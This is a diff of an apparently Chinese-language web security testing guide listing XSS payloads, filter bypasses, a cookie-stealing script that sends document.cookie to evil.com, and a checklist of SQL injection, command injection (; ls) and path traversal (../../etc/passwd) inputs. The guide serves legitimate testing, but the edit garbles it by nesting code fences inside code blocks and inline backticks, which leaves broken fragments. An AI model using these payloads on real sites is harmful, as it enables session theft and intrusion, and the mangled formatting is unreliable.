@@ -308,10 +308,22 @@ cursor.execute(f"SELECT * FROM users WHERE name = '{username}'")
 在输入框、URL 参数、评论区等输入：
 
 ```html
-<script>alert(1)</script>
+
+```html
+<script>
+alert(1)
+</script>
+```
+
 <img src=x onerror=alert(1)>
 <svg onload=alert(1)>
-"><script>alert(document.cookie)</script>
+">
+```html
+<script>
+alert(document.cookie)
+</script>
+```
+
 javascript:alert(1)
 ```
 
@@ -324,18 +336,36 @@ javascript:alert(1)
 
 ```html
 <!-- 基础 -->
-<script>alert(1)</script>
+
+```html
+<script>
+alert(1)
+</script>
+```
+
 
 <!-- 绕过简单过滤 -->
 <ScRiPt>alert(1)</ScRiPt>
-<script>alert`1`</script>
+
+```html
+<script>
+alert`1`
+</script>
+```
+
 <img src=x onerror=alert(1)>
 <svg/onload=alert(1)>
 <input onfocus=alert(1) autofocus>
 <details open ontoggle=alert(1)>
 
 <!-- 窃取 Cookie -->
-<script>new Image().src="http://evil.com/?c="+document.cookie</script>
+
+```html
+<script>
+new Image().src="http://evil.com/?c="+document.cookie
+</script>
+```
+
 
 <!-- DOM 型 -->
 <img src=x onerror="eval(atob('YWxlcnQoMSk='))">
@@ -350,7 +380,13 @@ javascript:alert(1)
 &lt;script&gt;alert(1)&lt;/script&gt;
 
 <!-- ❌ 不安全：原样输出 -->
-<script>alert(1)</script>
+
+```html
+<script>
+alert(1)
+</script>
+```
+
 ```
 
 ---
@@ -549,7 +585,13 @@ Body: {"userId": 1001}
 ### 10.2 注入
 
 - [ ] SQL 注入：输入 `' OR '1'='1`
-- [ ] XSS：输入 `<script>alert(1)</script>`
+- [ ] XSS：输入 `
+```html
+<script>
+alert(1)
+</script>
+```
+`
 - [ ] 命令注入：输入 `; ls`
 - [ ] 路径遍历：输入 `../../etc/passwd`
 
